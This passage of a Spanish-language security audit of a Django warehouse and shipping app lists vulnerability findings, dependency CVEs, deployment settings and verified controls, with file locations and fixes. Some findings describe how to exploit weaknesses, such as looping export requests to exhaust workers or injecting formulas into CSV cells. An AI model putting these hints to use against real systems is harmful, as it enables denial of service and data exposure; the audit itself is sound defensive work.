- **Dónde:** `apps/incidencias/services.py:680-712` (`ejecutar_reembolso`: `if comp.estado != APROBADA or comp.referencia_pago: return` sin `select_for_update`/`atomic`, y después `reembolsar_en_shopify`), `apps/integraciones/services.py:372-428` (`refundCreate` sin clave de idempotencia).
- **Impacto:** dos clics simultáneos en "reintentar", o Mesa y el cliente aprobando a la vez, mandan dos `refundCreate`; Shopify limita al monto pagado, pero con `monto` libre dos reembolsos parciales caben. **[a confirmar]** qué rechaza Shopify del lado servidor.
- **Corrección:** `select_for_update()` sobre la compensación + transición a `EJECUTANDO` antes de llamar a Shopify; guardar la referencia antes de salir de la transacción.

#### M-12 · Exportaciones y reportes del portal sin límite (DoS autenticado desde rol bajo)

- **Dónde:** `apps/portal/views.py:978-1000` (`_csv_pedidos`: `Pedido.objects.filter(cliente=…)` completo con prefetch, fila por fila), `:1031-1041` (`_csv_kardex` sin corte), `:1044-1072`, `:1075-1095` (`exportar` por GET `?csv=`); `apps/reportes/base.py:27-55` acepta cualquier rango `?desde=&hasta=` (años). Mesa sí acota `linea_tiempo` a 300 y `pedidos` a 200.
- **Impacto:** bucle de `GET /portal/exportar/?csv=pedidos` o `/portal/reportes/costos.csv?desde=2000-01-01` desde una cuenta de portal ocupa los 3 workers.
- **Corrección:** rango máximo (p. ej. 400 días), paginación/streaming (`StreamingHttpResponse`), throttle por usuario en exports.

#### M-13 · Sesiones largas en equipos compartidos

- **Dónde:** sin `SESSION_COOKIE_AGE`, `SESSION_EXPIRE_AT_BROWSER_CLOSE` ni expiración por inactividad (defaults de Django: 2 semanas; grep de `set_expiry`/`SESSION_` vacío).
- **Impacto:** tablets/PC de bodega compartidas quedan con sesión de piso (y de Mesa si entró) durante semanas.
- **Corrección:** 12 h para piso/Mesa, inactividad 30-60 min (middleware), `SESSION_EXPIRE_AT_BROWSER_CLOSE=True` en piso.

#### M-14 · Dependencias con vulnerabilidades conocidas y lock desactualizado

- **Django 5.2.17** → existe **5.2.18 (2026-10-06)** con 4 CVE, dos de ellos alcanzables sin autenticación (CVE-2026-84429, DoS cuadrático al parsear `Accept`/`Content-Type`; CVE-2026-77050, DoS en la negociación de idioma). `pip-audit` todavía no los reporta porque OSV/GHSA no los habían indexado al cierre.
- **urllib3 2.7.0** → 2.8.0: tres CVE (dos High), uno de ellos explotable por cualquier servidor que responda chunked a `requests` (Shopify, carriers, descarga de etiquetas).
- **sqlparse 0.5.5** → 0.6.0 (5 CVE de DoS; Django lo usa solo para partir SQL de migraciones; exposición baja). **multidict 6.7.1** → 6.9.1 (fuga de memoria; vía `aiohttp` ← `pywebpush`). **aiohttp 3.14.3** → 3.14.5 (8 advisories del 2026-10-07 sin CVE aún). **cryptography 50.0.0** → 50.0.2 (OpenSSL 4.0.3 con parches de agosto/septiembre 2026).
- El `requirements.lock` no coincide con el venv de dev en 13 paquetes (§6.2): lo que se prueba en dev no es lo que se instala en prod.
- Detalle, fechas y fuentes en §6.

### 5.3 Severidad BAJA

- **B-01 · Replay en envia y auditoría inflable.** `apps/envios/webhooks.py:38-51` no acota `X-Webhook-Timestamp` (mitigado por la dedupe de `EventoGuia`, `services.py:1285-1316`, y los estados terminales); `:66-71` `_ignorado` escribe hasta 4 000 chars del payload en `EventoAuditoria` por cada request con token válido.
- **B-02 · Inyección de fórmulas en CSV.** 30 llamadas a `writerow`/`writerows` en las exportaciones (12 en Mesa, 12 en Portal, 6 en Reportes; semgrep marca 23 con datos externos) sin neutralizar celdas que empiezan con `= + - @ \t \r`: `apps/mesa/views.py:2199-2232, 2644-2654, 2737-2738, 3885-3892`, `apps/portal/views.py:841-1060` (incluye "Comprador"), `apps/reportes/views.py:118-124`; `apps/pedidos/reportes.py:235-242`. Los exports se piensan para Excel (BOM en `portal/views.py:974`). Fix: prefijar `'` o `\t` a esas celdas.
- **B-03 · Página del repartidor y tokens sin caducidad.** `/r/e/<token>/` (`apps/rastreo/views.py:447-477`, `etiqueta_repartidor.html:97-112`) expone dirección completa, CP, referencias y Google Maps con lat/lng exactas a quien fotografíe el QR de la caja; `AccesoRastreo`/`AccesoEtiqueta` no caducan ni se revocan (`services.py:20-24, 42-46`). Recomendación: caducar `/r/e/` al ENTREGADO/RETORNO y `/r/` N días después de la entrega; mostrar solo colonia+CP al repartidor hasta que escanee en ruta.
- **B-04 · CSS injection / pixel externo vía branding.** `rastreo/pagina.html:10-12` y `etiqueta_repartidor.html:16-18` interpolan `{{ b.color_primario }}` en `<style>`; `FormCliente.brand_color_*` sin regex (`apps/mesa/forms.py:157-164`), `brand_logo_url` sin esquema (`:165`). Solo Mesa edita. Validar `^#[0-9a-fA-F]{3,8}$` y `https://`.
- **B-05 · `href` con URL del carrier sin validar esquema.** `apps/piso/templates/piso/salida.html:82` `href="{{ g.etiqueta_url }}"` ← `adapters.py:677 d0.get("label")`; `apps/piso/etiquetas.py:761-776` solo exige prefijo `https://`, sigue redirects y lee sin tope. Tercero de confianza; validar al persistir y limitar tamaño.
- **B-06 · Efectos secundarios por GET en Piso.** `apps/piso/views.py:1325` y `:1618` llaman `_tomar_abierto` también en GET → `_reclamar_si_libre` (`:260-276`) asigna el pedido y puede **reiniciar el picking** si lo soltó otro; `:3095` `tomar_restock` en GET; `:220-227` registra evento en GET. Un link/prefetch basta para "tomar" y borrar avance. Separar la toma a un POST.
- **B-07 · `portal_requerido` no verifica `Cliente.activo`.** `apps/core/decorators.py:46-56`; `Cliente.activo` (`core/models.py:89`) no se consulta en ninguna vista del portal: dar de baja un cliente no corta el acceso de sus usuarios.
- **B-08 · Evidencia de incidencias internas accesible al portal por pk.** `apps/core/views.py:190-233` resuelve `incidencia → cliente` sin excluir `interna=True`, mientras el portal oculta esas incidencias (`portal/views.py:537-541, 573-576`); `/evidencia/<pk>/` es secuencial. Solo datos del propio tenant.
- **B-09 · Agente de impresión.** Token en claro en plist/unit legibles por otros usuarios locales (`deploy/agente_impresion.py:42, 62`); log en `/tmp` compartido (`:48-49`); PDF completo a memoria sin tope (`:95-96`); `lp -o media=…` aceptaría opciones extra si `media` llevara espacios (`:102`; hoy constante en `envios/models.py:472-473`); un solo token sin rotación para todos los agentes, que baja todas las etiquetas (PII) y marca trabajos (`api_impresion.py:94-136`); urllib reenvía el Bearer en redirecciones. TLS sí se verifica (contexto por defecto de urllib).
- **B-10 · Cabeceras.** Sin `Content-Security-Policy` (51 handlers `on*=` y ~20 bloques `<script>` inline, 6 en `base.html`, impiden una CSP estricta sin refactor); sin `Permissions-Policy`; HSTS y `X-Content-Type-Options` **duplicados** (Django + `Caddyfile:11-14`) con valores distintos (Caddy sin `includeSubDomains`; los navegadores toman el primero); sin `SECURE_HSTS_PRELOAD`. `Referrer-Policy: same-origin` y `X-Frame-Options: DENY` sí están (defaults de Django). Nota: el modo `?embed=1` de rastreo (`rastreo/views.py:330`) no puede incrustarse en iframe por el DENY; si se quiere embeber, `frame-ancestors` acotado, no exención global.
- **B-11 · Despliegue.** `deploy/torre.service:13` `migrate --noinput` en cada arranque (sin ventana ni respaldo previo; implica que el rol de BD tiene DDL, lo que contradice el supuesto "solo INSERT/SELECT" del event log en `core/models.py:145`); `:15-16` gunicorn sin `--max-requests`, `--access-logfile -` registra rutas con tokens (H-03); sin hardening systemd (`NoNewPrivileges`, `ProtectSystem=strict`, `PrivateTmp`, `ProtectHome`); `crontab.txt:8-18` logs en `/var/log/torre/*.log` sin rotación.
- **B-12 · Retención y minimización.** `WebhookEvento.payload` guarda la orden completa de Shopify (correo, teléfono, dirección) indefinidamente y sin purga (`integraciones/models.py:68`); `Guia.raw`/`EventoGuia.raw`; la "retención mínima 12 meses" de evidencias no tiene job de purga; `EventoAuditoria` es append-only solo a nivel ORM (`.update()`/SQL lo saltan). Relevante para LFPDPPP (minimización) y para el tamaño del dump (M-06).
- **B-13 · CP sin normalizar e interpolaciones sin `quote`.** `apps/pedidos/services.py:1600` (`cp = str(...).strip()`), `Pedido.cp` max 10 (`pedidos/models.py:145`) vs `CotizacionCache.cp_destino` max 5 (`envios/models.py:557`) → `DataError` en Postgres al planear (pedido inservible: disponibilidad); CP sin `quote` en el path a 99minutos (`adapters.py:980`); `adapters.py:691` `f"{queries_base}/guide/{numero}"` sin `quote`; `shopify.py:315` `f'sku:"{codigo_sku}"'` sin escapar comillas (el match exacto posterior mitiga). `localidades.py:23,30-31` sí valida `^\d{5}$`.
- **B-14 · TOCTOU financieros menores.** `agendar_recoleccion` check-then-create (`apps/envios/services.py:779-798`; `unique_together` dispara después de cobrar el fee); `cancelar_guia` sin lock (`:987-1016`) → dos cancelaciones concurrentes registran dos `ReembolsoGuia` (`apps/finanzas/services.py:146-170`, sin idempotencia).
- **B-15 · VAPID `.pem` junto al código.** `apps/mensajeria/push.py:58-63` lo lee con ruta relativa a `BASE_DIR`; `*.pem` está en `.gitignore`. Permisos **[a confirmar en prod]**.
- **B-16 · Restablecimiento de contraseña sin throttle.** `OlvideView` permite mandar correos a cualquier dirección registrada en bucle (spam/costo SMTP); el enlace vale 72 h (`PASSWORD_RESET_TIMEOUT`, `settings.py:455`), largo para un enlace de acceso inicial.
- **B-17 · Detalles de JS.** `empaque_pedido.html:290` `KIT_BARRAS[campo.value]` sobre objeto plano (`__proto__`/`constructor` dan truthy; usar `Map`/`Object.hasOwn`); `render_manuales.py:111-117` `_link_html` no filtra `javascript:` (solo explotable editando los `.md` del repo).
- **B-18 · Mensajes de hooks reveladores.** `integraciones/views.py:37` 404 vs `:47-49` 403 "sin webhook secret" vs `:53` 401 "Firma HMAC inválida" (ver M-08); `envios/webhooks.py:177-178` distingue "cerrado o token inválido".
- **B-19 · Librerías vendorizadas sin versión.** `static/js/qrcode.min.js` (`qrcode-generator`, Kazuhiko Arase, sin número de versión en cabecera; sha256 `18ae399f…bf1780`) y `static/js/zxing.min.js` (`@zxing/library` UMD, sin cadena de versión; sha256 `d7cc8f69…8652d`). Sin CVEs conocidos para esas librerías al cierre, pero no hay forma de auditar la versión: fijar versión en un `package.json`/comentario de cabecera y verificar el hash contra npm. (El QR se pinta desde una URL del servidor y ZXing procesa frames de cámara, no HTML.)

---

## 6. Dependencias y referencias externas

### 6.1 `pip-audit` sobre `requirements.lock` (ejecutado 2026-10-15)

13 vulnerabilidades conocidas en 3 paquetes:

| Paquete (fijado) | Vulnerabilidad | Resumen | Corregido en |
|---|---|---|---|
| urllib3 2.7.0 | CVE-2026-97687 / GHSA-8988-9cw3-xx77 | configuración TLS del proxy (`proxy_ssl_context`, `proxy_assert_*`) aplicada incorrectamente | 2.8.0 |
| urllib3 2.7.0 | CVE-2026-97688 / GHSA-gh4c-6fx4-qh6g | descompresión de cuerpos chunked en streaming sin tope (DoS de memoria) | 2.8.0 |
| urllib3 2.7.0 | CVE-2026-97689 / GHSA-vxq7-64xx-v4gw | decodificación chunked en la API de streaming (DoS de memoria) | 2.8.0 |
| sqlparse 0.5.5 | CVE-2026-71491, CVE-2026-59893, CVE-2026-59894, CVE-2026-54284, CVE-2026-84305 | DoS/ReDoS al parsear SQL hostil; escape incorrecto en modos de salida Python/PHP | 0.6.0 |
| multidict 6.7.1 | CVE-2026-104874 / GHSA-54p9-h82j-f925 | fuga de referencias en la unión/resta de items view (crecimiento de memoria remoto) | 6.9.1 |

Exposición real: `urllib3` lo usa `requests` en todas las llamadas a Shopify/carriers (respuestas de terceros; riesgo medio); `sqlparse` solo lo usa Django para formatear SQL en debug/consola (riesgo bajo); `multidict` llega vía `aiohttp` ← `pywebpush` (riesgo bajo). Acción: `pip install -U urllib3 sqlparse multidict` y regenerar el lock; conviene además fijar hashes (`--require-hashes`) como sugiere `pip-audit`.

`requirements.txt` acepta rangos amplios (`Django>=5.0,<6`, `requests>=2.31`, `gunicorn>=23`) pero el lock fija versiones concretas: el riesgo está en no regenerar el lock con regularidad. Recomendación: Dependabot/Renovate o `pip-audit` en CI.

### 6.2 Deriva entre `requirements.lock` y el venv de desarrollo

El venv del repo ya no coincide con el lock en 13 paquetes (verificado con `importlib.metadata`): `gunicorn` 26.2.0 vs 26.0.0, `sqlparse` 0.6.0 vs 0.5.5, `multidict` 6.8.0 vs 6.7.1, `pywebpush` 2.5.0 vs 2.4.0, `reportlab` 5.0.1 vs 5.0.0, `psycopg` 3.3.5 vs 3.3.4, `cryptography` 50.0.1 vs 50.0.0, `boto3/botocore` 1.43.91 vs 1.43.74, `idna` 3.19 vs 3.18, `charset-normalizer` 3.5.1 vs 3.4.9; `packaging` y `tzdata` del lock no están instalados. `urllib3` sigue en 2.7.0 (vulnerable) en ambos. Si producción se instala desde el lock, prod corre las versiones **viejas** y las pruebas de dev no las representan. Acción: actualizar y regenerar el lock (`pip freeze`) tras cada cambio, idealmente con hashes.

### 6.3 Investigación web (consultada el 2026-10-15; fuentes al final de cada bloque)

**Django.** La versión fijada 5.2.17 (2026-08-04) tiene una security release posterior: **5.2.18 (2026-10-06)**, verificada en PyPI, con CVE-2026-77050 (DoS en `get_supported_language_variant()`), CVE-2026-84429 (DoS cuadrático en `parse_header_parameters()`, alcanzable sin autenticación vía `Accept`/`Content-Type`), CVE-2026-87890 (request forgery en lookups GIS; no aplica a Torre), CVE-2026-87975 (model formsets con PK editable; no aplica con `BigAutoField`) y un refuerzo del fix de CVE-2026-15830. Al cierre, estos CVE aún no aparecen en OSV/GHSA (por eso `pip-audit` no los marca); sí en NVD y en el weblog de Django. Soporte: 5.2 LTS recibe parches de seguridad hasta **abril 2028**; 6.2 LTS llega en abril 2027. Django 6.0 (2025-12) trae **CSP nativo** (`django.middleware.csp.ContentSecurityPolicyMiddleware`, `SECURE_CSP`, nonces vía `{{ csp_nonce }}`), sube PBKDF2 a 1 200 000 iteraciones y **exige Python ≥ 3.12**; 6.1 (2026-08) añade `{% csp_nonce_attr %}`, el check `security.W027`, derivación de salt no ambigua en cookies firmadas (`SIGNED_COOKIE_LEGACY_SALT_FALLBACK`), base64 estricto y PBKDF2 1 500 000. Fuentes: https://www.djangoproject.com/weblog/2026/oct/06/security-releases/ · https://docs.djangoproject.com/en/5.2/releases/5.2.18/ · https://docs.djangoproject.com/en/dev/releases/security/ · https://www.djangoproject.com/download/ · https://docs.djangoproject.com/en/6.0/releases/6.0/ · https://docs.djangoproject.com/en/6.1/releases/6.1/ · https://docs.djangoproject.com/en/6.1/ref/csp/

**Otras dependencias (además de §6.1).** `aiohttp` 3.14.3 (vía `pywebpush`): 8 advisories del repo publicados el 2026-10-07 (sin CVE todavía, no indexados en OSV): consumo de memoria/CPU sin límite, agotamiento de descriptores en multipart, request smuggling en el parser Python puro, cookies; Torre solo lo usa como cliente → actualizar a 3.14.5 (2026-10-11). `cryptography` 50.0.0 no tiene advisory propio, pero 50.0.1/50.0.2 (2026-09-30) re-empaquetan OpenSSL 4.0.2/4.0.3 con parches de agosto y septiembre 2026 (CVE-2026-84782 High en DTLS, CVE-2026-84783 UAF en caché X.509) → 50.0.2. `gunicorn` 26.0.0 ya incluye los fixes de request smuggling CVE-2024-1135 y CVE-2024-6827 (corregidos en 22.0.0); 26.2.0 (2026-08-24, PyPI) corrige una falla de seguridad HTTP/2 que no aplica a Torre (HTTP/1 tras Caddy). `pillow` 12.3.0, `requests` 2.34.2, `whitenoise` 6.12.0, `django-storages` 1.14.6, `psycopg` 3.3.4, `pywebpush` 2.4.0, `py-vapid` 1.9.4, `idna` 3.18, `yarl` 1.24.5, `boto3` 1.43.74: sin vulnerabilidades conocidas para la versión fijada (hay versiones más nuevas de mantenimiento). `reportlab` 5.0.0 es la release "resultado de revisiones de seguridad" (`trustedHosts=None` ya no confía en ninguna fuente; retira pyRXP); existe 5.0.1 (2026-08-20) sin changelog público localizable. Fuentes: https://api.osv.dev/v1/query · https://github.com/advisories?query=ecosystem%3Apip · https://github.com/aio-libs/aiohttp/security/advisories · https://cryptography.io/en/latest/changelog/ · https://openssl-library.org/news/vulnerabilities/ · https://github.com/advisories/GHSA-w3h3-4rj7-4ph4 · https://github.com/advisories/GHSA-hc5x-x2vx-497g · https://gunicorn.org/2026-news/ · https://docs.reportlab.com/releases/notes/whats-new-50/

**Python.** 3.11 está en fase "security only" con **EOL en octubre 2027**; la última es **3.11.17 (2026-10-01)**. 3.11.13 (la de dev) no incluye los parches posteriores de `tarfile` (CVE-2026-87910, CVE-2026-82049, CVE-2026-19672), `zipfile` (CVE-2026-15310), `http.cookies` (CVE-2026-3644), `urllib`/`http.client` (CVE-2026-15806), `xml`/expat (CVE-2025-59375, CVE-2026-24515, CVE-2026-25210, CVE-2026-4224), `ssl` (CVE-2026-19553, CVE-2026-19445) ni `html.parser`/`csv` (CVE-2026-17084, CVE-2026-2297). Torre no extrae tar/zip de usuarios ni parsea XML, así que la exposición directa es baja, pero conviene saber qué Python corre prod: en Debian bookworm el paquete `python3.11` 3.11.2-6+deb12u9 retroporta parches, con 9 CVE 2026 aún abiertos en el tracker. Django 6.x exigirá Python ≥ 3.12 (Debian trixie / Ubuntu 24.04). Fuentes: https://devguide.python.org/versions/ · https://www.python.org/downloads/release/python-31117/ · https://security-tracker.debian.org/tracker/source-package/python3.11

**Guías vigentes aplicables a Torre.**
- *Django deployment checklist (5.2/6.1)*: defaults ya correctos en Torre (`SECURE_CONTENT_TYPE_NOSNIFF`, `SECURE_REFERRER_POLICY=same-origin`, `SECURE_CROSS_ORIGIN_OPENER_POLICY=same-origin`, `X_FRAME_OPTIONS=DENY`, `SESSION_COOKIE_HTTPONLY`); recomendaciones no cubiertas: limitar tamaño de subidas en el servidor web, servir uploads desde otro origen (H-01), Django no limita intentos de login (M-01), `SECURE_PROXY_SSL_HEADER` solo si el proxy sobrescribe la cabecera (Caddy lo hace). CSP en 5.2 vía `django-csp` 4.x; nativo desde 6.0. https://docs.djangoproject.com/en/5.2/howto/deployment/checklist/ · https://docs.djangoproject.com/en/5.2/topics/security/ · https://django-csp.readthedocs.io/
- *OWASP Top 10:2025 (final)*: A01 Broken Access Control (incluye SSRF → M-07), A02 Security Misconfiguration (M-04, B-10), A03 Software Supply Chain Failures (M-14, §6.2), A04 Cryptographic Failures (M-06), A05 Injection (H-02, M-09, B-02), A06 Insecure Design (H-04, M-07), A07 Authentication Failures (M-01, M-02, M-13), A08 Software/Data Integrity Failures (H-03, M-08), A09 Logging & Alerting Failures (B-11), A10 Mishandling of Exceptional Conditions. https://top10.owasp.org/2025
- *OWASP Secure Headers (actualizado 2026-10-04)*: HSTS `max-age=63072000; includeSubDomains`, CSP con `default-src 'self'; form-action 'self'; base-uri 'self'; object-src 'none'; frame-ancestors 'none'`, `Permissions-Policy`, `Cross-Origin-*-Policy`, `Referrer-Policy: no-referrer`, quitar `Server`; `X-XSS-Protection` deprecada (si se manda, `0`). https://owasp.org/www-project-secure-headers/
- *Caddy*: `reverse_proxy` descarta los `X-Forwarded-*` entrantes salvo `trusted_proxies` ("by default, no proxies are trusted") → el `X-Forwarded-For` que recibe Django es confiable y debe usarse para la IP real (M-03); `request_body { max_size … }` no tiene límite por defecto (M-10); `header -Server` fuera de `reverse_proxy`. https://caddyserver.com/docs/caddyfile/directives/reverse_proxy · https://caddyserver.com/docs/caddyfile/directives/request_body · https://caddyserver.com/docs/caddyfile/options
- *gunicorn hardening*: `max_requests` + `max_requests_jitter`, `forwarded_allow_ips` default `127.0.0.1,::1` (correcto con Caddy local), `limit_request_*` por defecto razonables, `header_map drop`, `http2_cleartext off`; registrar `X-Forwarded-For` en `access_log_format`. https://gunicorn.org/reference/settings/ · https://gunicorn.org/deploy/

**Shopify.** Verificación vigente de webhooks: `X-Shopify-Hmac-SHA256` = Base64(HMAC-SHA256(cuerpo crudo, client secret)), comparar en tiempo constante antes de parsear (Torre lo hace); `X-Shopify-Webhook-Id` para deduplicar (Torre lo hace, pero la cabecera no está firmada → M-08); **`X-Shopify-Triggered-At`** para ordenar ("Shopify doesn't guarantee ordering within a topic") → Torre debería ignorar payloads más viejos que el último aplicado; responder 200 en < 5 s (reintentos: 8 en 4 h; tras 8 fallos Shopify borra las suscripciones creadas por API y avisa). API version `2026-01` (la de settings) es estable y accesible hasta **2027-01-16**; `2025-10` deja de ser accesible el 2026-10-16; la última estable es `2026-10`. Protección de datos: Torre maneja datos de **Nivel 2** (nombre, dirección, teléfono, correo) → Shopify exige minimización, períodos de retención (B-12), cifrado en reposo y en tránsito, **respaldos cifrados** (M-06), separación de datos de prueba y producción, registro de accesos y política de incidentes; los webhooks de cumplimiento (`customers/data_request`, `customers/redact`, `shop/redact`) son obligatorios para apps del App Store y recomendados para custom apps (el `shopify app security check` los verifica). Fuentes: https://shopify.dev/docs/apps/build/webhooks/subscribe/https · https://shopify.dev/docs/apps/build/webhooks/delivery-structure · https://shopify.dev/docs/api/usage/versioning · https://shopify.dev/changelog/release-notes/2026-01 · https://shopify.dev/docs/apps/launch/protected-customer-data · https://shopify.dev/docs/apps/build/privacy-law-compliance

**Web Push / VAPID.** Sin advisories para `pywebpush`, `py-vapid` ni `http_ece`. RFC 8292: JWT con `exp` ≤ 24 h, llave de firma distinta de la de cifrado; rotar la llave VAPID obliga a re-suscribir todos los dispositivos (planear la rotación con doble llave). Guardado: PEM fuera del árbol del proyecto, dueño `torre`, modo 0600, rotación/revocación planificadas. https://www.rfc-editor.org/rfc/rfc8292 · https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html

**CUPS en la PC de bodega (agente de impresión).** 2024: cadena `cups-browsed` (CVE-2024-47176/47076/47175/47177, RCE como `lp` vía PPD malicioso por UDP 631/mDNS). 2025: CVE-2025-58060 (bypass de autenticación), CVE-2025-58364 (DoS). 2026: CUPS 2.4.17 (2026-04) corrige CVE-2026-34980 (Print-Job anónimo a cola compartida → RCE) y CVE-2026-34990 (escalada local); 2.4.20 (2026-10-05) corrige otra decena, incluido CVE-2026-105326 (argument injection en el notificador mailto → RCE) y bypasses de -34980; hay advisories del 6–14 de octubre de 2026 **sin release aún** (incluida una fuga del token root de autenticación local). macOS: 26.7.1 / 15.8.1 (2026-09-28) corrigen nueve CVE de CUPS, dos de ejecución remota. Mitigaciones para la máquina del agente: SO al día; `Listen localhost:631` y **ninguna impresora compartida** (el agente imprime en local); en Linux desactivar `cups-browsed`; firewall a 631/tcp+udp y 5353/udp; la cuenta del agente sin `lpadmin`; segmento de red de bodega sin acceso desde Internet. Fuentes: https://github.com/OpenPrinting/cups/security/advisories · https://ubuntu.com/security/CVE-2026-34980 · https://access.redhat.com/security/cve/cve-2026-34990 · https://support.apple.com/en-us/149042 · https://security-tracker.debian.org/tracker/source-package/cups

**DigitalOcean Spaces (evidencias y respaldos).** Cifrado en reposo del lado de DO y TLS en tránsito; sin cifrado configurable por bucket (solo SSE-C) → cifrar los dumps del lado cliente antes de subir (`pg_dump -Fc | age -r <pubkey>`). Solo existen ACL `private`/`public-read`; el listado del bucket es privado por defecto; **llaves limitadas por bucket** (GA 2024-12) con permisos Read o Read/Write/Delete → una llave distinta para respaldos y para la app (M-06); el secreto se muestra una sola vez y "Regenerate" invalida el anterior (rotar creando la nueva primero). El CDN solo sirve objetos públicos: desactivarlo en buckets privados. Access logs (GA 2025-06), versionado y reglas de lifecycle (retención de respaldos) solo por API. `django-storages`: `default_acl=None` hereda privado, `querystring_auth=True`, valorar `file_overwrite=False` (Torre ya lo hace). Fuentes: https://docs.digitalocean.com/products/spaces/how-to/manage-access/ · https://docs.digitalocean.com/products/spaces/release-notes/ · https://www.digitalocean.com/security/security-best-practices-guide-spaces · https://django-storages.readthedocs.io/en/latest/backends/amazon-S3.html · https://www.postgresql.org/docs/16/backup-dump.html

**No encontrado / sin verificar por el agente web:** changelog de reportlab 5.0.1; versión exacta de OpenSSL embebida en cryptography 50.0.0 (inferida 4.0.1); fecha oficial de publicación del OWASP Top 10:2025 final (commits del repo del 2025-12-24); postura explícita de Shopify sobre webhooks de cumplimiento en apps custom; estado de `python3` en Ubuntu; contenido del post "Django security reporting update" (2026-10-08).

---

## 7. Configuración de despliegue (lo que está en `deploy/`)

| Elemento | Estado | Observación |
|---|---|---|
| Caddy (`deploy/Caddyfile`) | TLS automático, `reverse_proxy 127.0.0.1:8000`, HSTS y nosniff | sin `request_body max_size`, sin rate limiting, sin `log`; cabeceras duplicadas con Django (B-10); `encode gzip` (BREACH mitigado por el enmascarado del CSRF token) |
| gunicorn (`deploy/torre.service`) | `--bind 127.0.0.1:8000 --workers 3 --timeout 60 --access-logfile -` | `forwarded-allow-ips` default (127.0.0.1) correcto; falta `--max-requests`/`--max-requests-jitter`; access log con tokens en la ruta (H-03) |
| systemd | `User=torre`, `Restart=always`, `migrate` + `collectstatic` en `ExecStartPre` | sin `NoNewPrivileges`, `ProtectSystem=strict`, `ProtectHome`, `PrivateTmp`, `ReadWritePaths` acotados (B-11) |
| cron (`deploy/crontab.txt`) | management commands idempotentes cada 5–30 min, respaldo 03:00 | logs sin rotación; respaldo sin cifrar al bucket operativo, sin retención remota (M-06) |
| `.env` | cargado por `settings.py:14-20`, ignorado por git | permisos **[a confirmar en prod]** (`chmod 600`, dueño `torre`) |
| Agente de impresión | token en plist/unit, polling cada 3 s, `lp` local | B-09 |

`manage.py check --deploy` con entorno de producción simulado (`TORRE_HTTPS=1`, `TORRE_DEBUG=0`, llave larga): solo avisa `SECURE_SSL_REDIRECT` apagado (lo hace Caddy) y `SECURE_HSTS_PRELOAD` apagado — ambos aceptables. Con el entorno de dev tal cual: avisa `DEBUG`, `SECRET_KEY` insegura, cookies sin `Secure`, sin HSTS (esperado en dev; es el riesgo de M-04 si un despliegue arranca así).

---

## 8. Controles verificados OK (no hace falta re-auditarlos)

**Autenticación y autorización**
- 44 vistas de Mesa, 19 de Piso y 19 de Portal llevan su decorador (`rol_requerido`/`portal_requerido`); Piso no puede ejecutar nada de Mesa (403); un usuario de Mesa en `/portal/` por GET es redirigido y por POST recibe 403 (`apps/core/decorators.py`).
- Tenancy en Portal: todos los detalles usan `cliente=request.cliente` (`portal/views.py:426-429, 578-581, 506, 1033`), listas filtradas, formularios con querysets acotados (`portal/forms.py:69-75`, `catalogo/forms.py:81-84`, `inventario/forms.py:81-84`), `anunciar_asn` re-valida `sku.cliente_id`, los 10 módulos de `apps/reportes` filtran por cliente y ocultan columnas de Mesa.
- `core.evidencia`: login + rol/tenant con 404 uniforme; rutas de archivo desde la BD (sin traversal); `rastreo.pod` solo con token y pedido entregado; MEDIA jamás servido (`torre_project/urls.py:16-18`).
- Sin `ModelForm`: todos los forms son `forms.Form` con `datos_*()` explícitos (sin mass assignment); `update(**datos)` solo con dicts whitelisted.
- Sin open redirect: ningún `redirect()` toma host/URL del request; `LoginView` estándar valida `next`.
- Contraseña: `PasswordChangeForm` exige la actual; cambio de PIN exige contraseña; PIN siempre hasheado (`core/models.py:120-135`) y comparado en tiempo constante; reset con `PasswordResetView` (respuesta uniforme, token de un solo uso); `enviar_acceso` ignora correos placeholder `@torre380e.mx`; login con error genérico.
- Admin: solo superusers tienen `is_staff`; modelos de auditoría/kardex/ajustes/escaneos son solo lectura en admin.
- Piso: propiedad de pedidos validada en transferencias, restock, reemplazo de fotos (no congeladas) y corrección de cajas; doble firma real en `aplicar_ajuste` y `dictaminar_cuarentena` (dos personas distintas).
- Push: `require_POST`, sesión + rol piso/mesa, lista blanca de hosts de push services, sin PII en payload; logout poda suscripciones.

**Webhooks e integraciones**
- Shopify: HMAC-SHA256 sobre `request.body` crudo, base64, `hmac.compare_digest`, `TypeError` manejado; fail-closed sin secret en producción; idempotencia por `webhook_id` con `get_or_create`; topics desconocidos ignorados; cuerpo acotado por `DATA_UPLOAD_MAX_MEMORY_SIZE` (2.5 MB).
- Tokens de carriers e impresión con `compare_digest`, cerrados si están vacíos, 403 sin pistas.
- Salientes: 20/20 llamadas `requests` con `timeout`; ningún `verify=False`; sin `shell=True`, `pickle`, `yaml.load`, `eval/exec`, parsers XML ni zips; `subprocess` con listas, cola desde `.env`, tempfiles 0600 borrados en `finally`.
- reportlab: solo `drawString`/`drawText` (sin `Paragraph`/XML → sin inyección de marcado).
- Guías: compra bajo `select_for_update` (sin doble compra); iMile/99minutos recuperan la guía ya creada por clave duplicada; reintento por red solo si nunca llegó. Push de inventario con compare-and-swap e idempotencia por uuid4; datos por variables GraphQL.
- Spaces: `default_acl: private`, `querystring_auth: True`, `file_overwrite: False`.
- Correo: destinatarios validados con `validate_email`; Django rechaza saltos de línea en cabeceras; WhatsApp con `format_map` seguro.
- Mesa oculta token/secret (type=password, últimos 4) y no audita los valores; Salud de sync no muestra payloads ni tokens.
- Import CSV: tope de tamaño (`IMPORT_CSV_MAX_MB`) y de filas (`IMPORT_CSV_MAX_FILAS`), decodificación controlada.

**Front-end**
- 151 formularios POST en 100 templates → 151 con `{% csrf_token %}`; fetch POST con `X-CSRFToken` (`picking_pedido.html:244-247`, `salida_registrar.html:101-104`, `push.js:42-50`).
- `|safe` solo en 2 lugares (H-02 y manuales pre-renderizados offline desde `.md` del repo, con escape previo y slug validado contra `_indice.json`); `mark_safe`/`format_html`/`autoescape off`: 0; `json_script` 5 usos correctos.
- 45 `target="_blank"`, todos con `rel="noopener"`; URLs de carriers con `quote()` sobre patrones https fijos; `wa.me` solo con dígitos; `url_tienda` fuerza `https://`.
- Service worker: cachea solo `/static/*`, nunca navegaciones ni respuestas con sesión; registro solo en páginas autenticadas; `localStorage` solo tema y acordeones; sin `sessionStorage`/IndexedDB.
- Sin tokens/secretos en templates (solo la llave pública VAPID, pública por diseño); context processor acota `settings.TORRE` a 6 claves operativas.

**Repositorio**
- `.env`, `.env.*`, `*.pem`, `media/`, `torre.sqlite3` ignorados y nunca versionados; el historial completo de git no contiene secretos reales (solo `shpat_prueba`, `token-de-prueba-envia` y un PEM de prueba en tests).
